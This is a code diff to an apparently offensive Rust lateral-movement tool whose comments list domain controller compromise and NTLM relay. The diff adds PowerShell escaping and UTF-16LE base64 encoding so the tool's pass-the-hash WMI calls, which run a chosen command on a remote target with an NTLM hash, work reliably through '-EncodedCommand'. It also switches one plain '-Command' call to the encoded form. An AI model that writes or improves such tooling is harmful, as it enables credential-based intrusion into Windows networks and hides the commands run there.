@@ -11,8 +11,23 @@
 /// - Domain controller compromise
 /// - Network relay attacks (NTLM relay)
 use anyhow::{anyhow, Result};
+use base64::{engine::general_purpose::STANDARD, Engine as _};
 use std::collections::HashMap;
 use std::process::{Command, Stdio};
+
+fn escape_ps_val(val: &str) -> String {
+    val.replace('`', "``")
+        .replace('$', "`$")
+        .replace('"', "`\"")
+}
+
+fn encode_ps_command(command: &str) -> String {
+    let utf16_le: Vec<u8> = command
+        .encode_utf16()
+        .flat_map(|v| v.to_le_bytes())
+        .collect();
+    STANDARD.encode(utf16_le)
+}
 
 /// 🔥 REMOTE TARGET INFO
 #[derive(Clone, Debug)]
@@ -73,13 +88,15 @@ $wmiParams = {{
 
 Invoke-WmiMethod @wmiParams
 "#,
-            hash, target, command
+            escape_ps_val(hash),
+            escape_ps_val(target),
+            escape_ps_val(command)
         );
 
         eprintln!("   Executing WMI call with NTLM hash");
 
         let output = Command::new("powershell")
-            .args(&["-NoProfile", "-EncodedCommand", &base64::encode(&ps_cmd)])
+            .args(&["-NoProfile", "-EncodedCommand", &encode_ps_command(&ps_cmd)])
             .stdout(Stdio::piped())
             .stderr(Stdio::piped())
             .output()?;
@@ -162,11 +179,14 @@ $wmiParams2 = {{
 
 Get-WmiObject @wmiParams2 | Remove-WmiObject
 "#,
-            target, hash, username, command
+            escape_ps_val(target),
+            escape_ps_val(hash),
+            escape_ps_val(username),
+            escape_ps_val(command)
         );
 
         let output = Command::new("powershell")
-            .args(&["-NoProfile", "-Command", &ps_cmd])
+            .args(&["-NoProfile", "-EncodedCommand", &encode_ps_command(&ps_cmd)])
             .stdout(Stdio::piped())
             .stderr(Stdio::piped())
             .output()?;
@@ -431,5 +451,21 @@ mod tests {
     async fn test_enumerate_network() {
         let result = LateralMovementEngine::enumerate_network().await;
         assert!(result.is_ok());
+    }
+
+    #[test]
+    fn test_escape_ps_val() {
+        assert_eq!(escape_ps_val("normal"), "normal");
+        assert_eq!(escape_ps_val("with \"quote\""), "with `\"quote`\"");
+        assert_eq!(escape_ps_val("with $sign"), "with `$sign");
+        assert_eq!(escape_ps_val("with `backtick"), "with ``backtick");
+        assert_eq!(escape_ps_val("complex \"$`"), "complex `\"`$``");
+    }
+
+    #[test]
+    fn test_encode_ps_command() {
+        // "whoami" in UTF-16LE is: 77 00 68 00 6f 00 61 00 6d 00 69 00
+        // Base64 of that is: dwBoAG8AYQBtAGkA
+        assert_eq!(encode_ps_command("whoami"), "dwBoAG8AYQBtAGkA");
     }
 }
